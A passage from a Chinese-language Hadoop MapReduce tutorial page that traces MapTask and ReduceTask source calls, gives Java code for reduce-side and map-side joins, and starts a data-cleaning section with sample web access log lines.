class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">=================== MapTask ===================</span><br><span class="line">context.write(k, NullWritable.get());   </span><br><span class="line"><span class="comment">//自定义的map方法的写出，进入</span></span><br><span class="line">output.write(key, value);  </span><br><span class="line">  <span class="comment">//MapTask727行，收集方法，进入两次 </span></span><br><span class="line">  collector.collect(key, value,partitioner.getPartition(key, value, partitions));</span><br><span class="line">  HashPartitioner(); <span class="comment">//默认分区器</span></span><br><span class="line">  <span class="comment">//MapTask1082行 map端所有的kv全部写出后会走下面的close方法</span></span><br><span class="line">  collect()  </span><br><span class="line">    close() <span class="comment">//MapTask732行</span></span><br><span class="line">    collector.flush() <span class="comment">// 溢出刷写方法，MapTask735行，提前打个断点，进入</span></span><br><span class="line">      sortAndSpill() <span class="comment">//溢写排序，MapTask1505行，进入</span></span><br><span class="line">        sorter.sort()   QuickSort <span class="comment">//溢写排序方法，MapTask1625行，进入</span></span><br><span class="line">       mergeParts(); <span class="comment">//合并文件，MapTask1527行，进入</span></span><br><span class="line"></span><br><span class="line">     collector.close(); <span class="comment">//MapTask739行,收集器关闭,即将进入ReduceTask</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=================== ReduceTask ===================</span><br><span class="line"><span class="keyword">if</span> (isMapOrReduce())  <span class="comment">//reduceTask324行，提前打断点</span></span><br><span class="line">initialize()   <span class="comment">// reduceTask333行,进入</span></span><br><span class="line">init(shuffleContext);  <span class="comment">// reduceTask375行,走到这需要先给下面的打断点</span></span><br><span class="line">        totalMaps = job.getNumMapTasks(); <span class="comment">// ShuffleSchedulerImpl第120行，提前打断点</span></span><br><span class="line">         merger = createMergeManager(context); <span class="comment">//合并方法，Shuffle第80行</span></span><br><span class="line">      <span class="comment">// MergeManagerImpl第232 235行，提前打断点</span></span><br><span class="line">      <span class="keyword">this</span>.inMemoryMerger = createInMemoryMerger(); <span class="comment">//内存合并</span></span><br><span class="line">      <span class="keyword">this</span>.onDiskMerger = <span class="keyword">new</span> OnDiskMerger(<span class="keyword">this</span>); <span class="comment">//磁盘合并</span></span><br><span class="line">rIter = shuffleConsumerPlugin.run();</span><br><span class="line">    eventFetcher.start();  <span class="comment">//开始抓取数据，Shuffle第107行，提前打断点</span></span><br><span class="line">    eventFetcher.shutDown();  <span class="comment">//抓取结束，Shuffle第141行，提前打断点</span></span><br><span class="line">    copyPhase.complete();   <span class="comment">//copy阶段完成，Shuffle第151行</span></span><br><span class="line">    taskStatus.setPhase(TaskStatus.Phase.SORT);  <span class="comment">//开始排序阶段，Shuffle第152行</span></span><br><span class="line">  sortPhase.complete();   <span class="comment">//排序阶段完成，即将进入reduce阶段 reduceTask382行</span></span><br><span class="line">reduce();  <span class="comment">//reduce阶段调用的就是我们自定义的reduce方法，会被调用多次</span></span><br><span class="line">  cleanup(context); <span class="comment">//reduce完成之前，会最后调用一次Reducer里面的cleanup方法</span></span><br></pre></td></tr></table></figure><h3 id="3-6-Join应用">3.6 Join应用</h3><p>现在有以下需求</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330927.png" alt></p><p>首先是传统的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TableBean</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableBean</span> <span class="keyword">implements</span> <span class="title">Writable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String id; <span class="comment">//订单id</span></span><br><span class="line">    <span class="keyword">private</span> String pid; <span class="comment">//产品id</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> amount; <span class="comment">//产品数量</span></span><br><span class="line">    <span class="keyword">private</span> String pname; <span class="comment">//产品名称</span></span><br><span class="line">    <span class="keyword">private</span> String flag; <span class="comment">//判断是order表还是pd表的标志字段</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TableBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPid</span><span class="params">(String pid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pid = pid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAmount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> amount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAmount</span><span class="params">(<span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.amount = amount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPname</span><span class="params">(String pname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pname = pname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(String flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id + <span class="string">"\t"</span> + pname + <span class="string">"\t"</span> + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(DataOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.writeUTF(id);</span><br><span class="line">        out.writeUTF(pid);</span><br><span class="line">        out.writeInt(amount);</span><br><span class="line">        out.writeUTF(pname);</span><br><span class="line">        out.writeUTF(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFields</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = in.readUTF();</span><br><span class="line">        <span class="keyword">this</span>.pid = in.readUTF();</span><br><span class="line">        <span class="keyword">this</span>.amount = in.readInt();</span><br><span class="line">        <span class="keyword">this</span>.pname = in.readUTF();</span><br><span class="line">        <span class="keyword">this</span>.flag = in.readUTF();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TableMapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>,<span class="title">Text</span>,<span class="title">TableBean</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String filename;</span><br><span class="line">    <span class="keyword">private</span> Text outK = <span class="keyword">new</span> Text();</span><br><span class="line">    <span class="keyword">private</span> TableBean outV = <span class="keyword">new</span> TableBean();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setup</span><span class="params">(Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//获取对应文件名称</span></span><br><span class="line">        InputSplit split = context.getInputSplit();</span><br><span class="line">        FileSplit fileSplit = (FileSplit) split;</span><br><span class="line">        filename = fileSplit.getPath().getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取一行</span></span><br><span class="line">        String line = value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是哪个文件,然后针对文件进行不同的操作</span></span><br><span class="line">        <span class="keyword">if</span>(filename.contains(<span class="string">"order"</span>))&#123;  <span class="comment">//订单表的处理</span></span><br><span class="line">            String[] split = line.split(<span class="string">"\t"</span>);</span><br><span class="line">            <span class="comment">//封装outK</span></span><br><span class="line">            outK.set(split[<span class="number">1</span>]);</span><br><span class="line">            <span class="comment">//封装outV</span></span><br><span class="line">            outV.setId(split[<span class="number">0</span>]);</span><br><span class="line">            outV.setPid(split[<span class="number">1</span>]);</span><br><span class="line">            outV.setAmount(Integer.parseInt(split[<span class="number">2</span>]));</span><br><span class="line">            outV.setPname(<span class="string">""</span>);</span><br><span class="line">            outV.setFlag(<span class="string">"order"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;                             <span class="comment">//商品表的处理</span></span><br><span class="line">            String[] split = line.split(<span class="string">"\t"</span>);</span><br><span class="line">            <span class="comment">//封装outK</span></span><br><span class="line">            outK.set(split[<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">//封装outV</span></span><br><span class="line">            outV.setId(<span class="string">""</span>);</span><br><span class="line">            outV.setPid(split[<span class="number">0</span>]);</span><br><span class="line">            outV.setAmount(<span class="number">0</span>);</span><br><span class="line">            outV.setPname(split[<span class="number">1</span>]);</span><br><span class="line">            outV.setFlag(<span class="string">"pd"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//写出KV</span></span><br><span class="line">        context.write(outK,outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>,<span class="title">TableBean</span>,<span class="title">TableBean</span>, <span class="title">NullWritable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;TableBean&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;TableBean&gt; orderBeans = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        TableBean pdBean = <span class="keyword">new</span> TableBean();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (TableBean value : values) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//判断数据来自哪个表</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"order"</span>.equals(value.getFlag()))&#123;   <span class="comment">//订单表</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//创建一个临时TableBean对象接收value</span></span><br><span class="line">                TableBean tmpOrderBean = <span class="keyword">new</span> TableBean();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    BeanUtils.copyProperties(tmpOrderBean,value);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//将临时TableBean对象添加到集合orderBeans</span></span><br><span class="line">                orderBeans.add(tmpOrderBean);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;                                    <span class="comment">//商品表</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    BeanUtils.copyProperties(pdBean,value);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历集合orderBeans,替换掉每个orderBean的pid为pname,然后写出</span></span><br><span class="line">        <span class="keyword">for</span> (TableBean orderBean : orderBeans) &#123;</span><br><span class="line"></span><br><span class="line">            orderBean.setPname(pdBean.getPname());</span><br><span class="line">            <span class="comment">//写出修改后的orderBean对象</span></span><br><span class="line">            context.write(orderBean,NullWritable.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableDriver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException </span>&#123;</span><br><span class="line">        Job job = Job.getInstance(<span class="keyword">new</span> Configuration());</span><br><span class="line"></span><br><span class="line">        job.setJarByClass(TableDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapperClass(TableMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setReducerClass(TableReducer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        job.setMapOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapOutputValueClass(TableBean<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        job.setOutputKeyClass(TableBean<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setOutputValueClass(NullWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(<span class="string">"C:\\Users\\SHAWN\\Desktop\\Hadoop3.x\\input"</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(<span class="string">"C:\\Users\\SHAWN\\Desktop\\Hadoop3.x\\output"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> b = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但这种方式中，合并的操作是在Reduce阶段完成，Reduce端的处理压力太大，Map节点的运算负载则很低，资源利用率不高，且在Reduce阶段极易产生数据倾斜。<strong>解决方案：Map端实现数据合并</strong></p><p>Map Join适用于一张表十分小、一张表很大的场景。在Map端缓存多张表，提前处理业务逻辑，这样增加Map端业务，减少Reduce端数据的压力，尽可能的减少数据倾斜。<strong>具体办法：采用DistributedCache</strong>，在Mapper的setup阶段，将文件读取到缓存集合中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先在MapJoinDriver驱动类中添加缓存文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapJoinDriver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, URISyntaxException, ClassNotFoundException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取job信息</span></span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        Job job = Job.getInstance(conf);</span><br><span class="line">        <span class="comment">// 2 设置加载jar包路径</span></span><br><span class="line">        job.setJarByClass(MapJoinDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 3 关联mapper</span></span><br><span class="line">        job.setMapperClass(MapJoinMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 4 设置Map输出KV类型</span></span><br><span class="line">        job.setMapOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setMapOutputValueClass(NullWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 5 设置最终输出KV类型</span></span><br><span class="line">        job.setOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        job.setOutputValueClass(NullWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载缓存数据</span></span><br><span class="line">        job.addCacheFile(<span class="keyword">new</span> URI(<span class="string">"file:///D:/input/tablecache/pd.txt"</span>));</span><br><span class="line">        <span class="comment">// Map端Join的逻辑不需要Reduce阶段，设置reduceTask数量为0</span></span><br><span class="line">        job.setNumReduceTasks(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6 设置输入输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(<span class="string">"D:\\input"</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(<span class="string">"D:\\output"</span>));</span><br><span class="line">        <span class="comment">// 7 提交</span></span><br><span class="line">        <span class="keyword">boolean</span> b = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在MapJoinMapper类中的setup方法中读取缓存文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapJoinMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">NullWritable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; pdMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> Text text = <span class="keyword">new</span> Text();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//任务开始前将pd数据缓存进pdMap</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setup</span><span class="params">(Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过缓存文件得到小表数据pd.txt</span></span><br><span class="line">        URI[] cacheFiles = context.getCacheFiles();</span><br><span class="line">        Path path = <span class="keyword">new</span> Path(cacheFiles[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取文件系统对象,并开流</span></span><br><span class="line">        FileSystem fs = FileSystem.get(context.getConfiguration());</span><br><span class="line">        FSDataInputStream fis = fs.open(path);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过包装流转换为reader,方便按行读取</span></span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(fis, <span class="string">"UTF-8"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//逐行读取，按行处理</span></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> (StringUtils.isNotEmpty(line = reader.readLine())) &#123;</span><br><span class="line">            <span class="comment">//切割一行    </span></span><br><span class="line">            <span class="comment">//01  小米</span></span><br><span class="line">            String[] split = line.split(<span class="string">"\t"</span>);</span><br><span class="line">            pdMap.put(split[<span class="number">0</span>], split[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关流</span></span><br><span class="line">        IOUtils.closeStream(reader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取大表数据    </span></span><br><span class="line">        <span class="comment">//1001  01  1</span></span><br><span class="line">        String[] fields = value.toString().split(<span class="string">"\t"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过大表每行数据的pid,去pdMap里面取出pname</span></span><br><span class="line">        String pname = pdMap.get(fields[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将大表每行数据的pid替换为pname</span></span><br><span class="line">        text.set(fields[<span class="number">0</span>] + <span class="string">"\t"</span> + pname + <span class="string">"\t"</span> + fields[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//写出</span></span><br><span class="line">        context.write(text,NullWritable.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-7-数据清洗-ETL">3.7 数据清洗(ETL)</h3><p>ETL，是英文Extract-Transform-Load的缩写，用来描述将数据从来源端经过抽取（Extract）、转换（Transform）、加载（Load）至目的端的过程。ETL一词较常用在数据仓库，但其对象并不限于数据仓库。</p><p>在运行核心业务MapReduce程序之前，往往要先对数据进行清洗，清理掉不符合用户要求的数据。**清理的过程往往只需要运行Mapper程序，不需要运行Reduce程序。**例如去除日志中字段个数小于等于11的日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">194.237.142.21 - - [18/Sep/2013:06:49:18 +0000] <span class="string">"GET /wp-content/uploads/2013/07/rstudio-git3.png HTTP/1.1"</span> 304 0 <span class="string">"-"</span> <span class="string">"Mozilla/4.0 (compatible;)"</span></span><br><span class="line">183.49.46.228 - - [18/Sep/2013:06:49:23 +0000] <span class="string">"-"</span> 400 0 <span class="string">"-"</span> <span class="string">"-"</span></span><br><span class="line">163.177.71.12 - - [18/Sep/2013:06:49:33 +0000] <span class="string">"HEAD / HTTP/1.1"</span> 200 20 <span class="string">"-"</span> <span class="string">"DNSPod-Monitor/1.0"</span></span><br><span class="line">163.177.71.12 - - [18/Sep/2013:06:49:36 +0000] <span class="string">"HEAD / HTTP/1.1"</span> 200 20 <span class="string">"-"</span> <span class="string">"DNSPod-Monitor/1.0"</span></span><br><span class="line">101.226.68.137 - - [18/Sep/2013:06:49:42 +0000] <span class="string">"HEAD 